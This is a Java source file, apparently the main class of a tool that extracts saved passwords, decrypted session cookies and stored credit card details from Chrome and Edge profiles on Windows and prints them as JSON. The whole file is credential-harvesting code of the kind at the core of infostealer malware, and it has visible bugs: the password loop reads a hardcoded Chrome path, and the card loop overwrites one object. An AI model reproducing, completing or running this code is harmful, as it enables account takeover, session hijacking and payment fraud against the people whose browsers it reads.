package pwdfnd;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONObject;

public class Main {

	public static enum OPERATION {
		COOKIE, PASSWORD, CREDITCARD
	};

	public static OPERATION op;

	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub

		for (String arg : args) {

			if (arg.startsWith("cookie")) {
				op = OPERATION.COOKIE;
			} else if (arg.startsWith("password")) {
				op = OPERATION.PASSWORD;
			} else if (arg.startsWith("creditcard")) {
				op = OPERATION.CREDITCARD;
			}

		}

		ArrayList<String> paths = new ArrayList<>();

		paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data");
		paths.add(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data");

		if (op == OPERATION.PASSWORD) {
			JSONArray passwords = new JSONArray();

			for (String path : paths) {

				if (Files.exists(Paths.get(path))) {

					System.err.println("Searching passwords in " + path);

					for (HashMap<String, String> entry : Chrome.GetAllPasswords(
							System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data")) {

						// System.out.println("--> " + entry.get("origin"));
						// System.out.println(" |-> Username: " + entry.get("username"));
						// System.out.println(" |-> Password: " + entry.get("password"));

						JSONObject password = new JSONObject();
						password.put("origin", entry.get("origin"));
						password.put("username", entry.get("username"));
						password.put("password", entry.get("password"));

						passwords.put(password);

					}

				}

			}

			System.out.println(passwords.toString());
		}

		if (op == OPERATION.COOKIE) {

			JSONArray cookies = new JSONArray();

			for (String path : paths) {

				if (Files.exists(Paths.get(path))) {

					System.err.println("Searching cookies in " + path);

					for (HashMap<String, String> entry : Chrome.GetAllCookies(path)) {

						JSONObject cookie = new JSONObject();

						cookie.put("decrypted_value", entry.get("decrypted_value"));
						cookie.put("host_key", entry.get("host_key"));
						cookie.put("name", entry.get("name"));
						cookie.put("value", entry.get("value"));
						cookie.put("path", entry.get("path"));
						cookie.put("expires_utc", Integer.valueOf(entry.get("expires_utc")));
						cookie.put("creation_utc", Integer.valueOf(entry.get("creation_utc")));
						cookie.put("is_secure", Integer.valueOf(entry.get("is_secure")));
						cookie.put("is_httponly", Integer.valueOf(entry.get("is_httponly")));
						cookie.put("last_access_utc", Integer.valueOf(entry.get("last_access_utc")));
						cookie.put("has_expires", Integer.valueOf(entry.get("has_expires")));
						cookie.put("is_persistent", Integer.valueOf(entry.get("is_persistent")));
						cookie.put("priority", Integer.valueOf(entry.get("priority")));
						cookie.put("samesite", Integer.valueOf(entry.get("samesite")));
						cookie.put("source_scheme", Integer.valueOf(entry.get("source_scheme")));
						cookie.put("source_port", Integer.valueOf(entry.get("source_port")));
						cookie.put("is_same_party", Integer.valueOf(entry.get("is_same_party")));

						cookies.put(cookie);

					}

				}

			}

			System.out.println(cookies.toString());
		}

		if (op == OPERATION.CREDITCARD) {

			
			JSONObject creditcard = new JSONObject();
			
			for (String path : paths) {

				System.err.println("Searching creditcards in " + path);
				
				for (HashMap<String, String> entry : Chrome.GetAllCreditcard(path)) {

					

					creditcard.put("name_on_card", entry.get("name_on_card"));
					creditcard.put("nickname", entry.get("nickname"));
					creditcard.put("card_number", entry.get("card_number"));
					creditcard.put("expiration_month", Integer.valueOf(entry.get("expiration_month")));
					creditcard.put("expiration_year", Integer.valueOf(entry.get("expiration_year")));

				}

			}
			
			System.out.println(creditcard.toString());
			
			
		}

	}

}
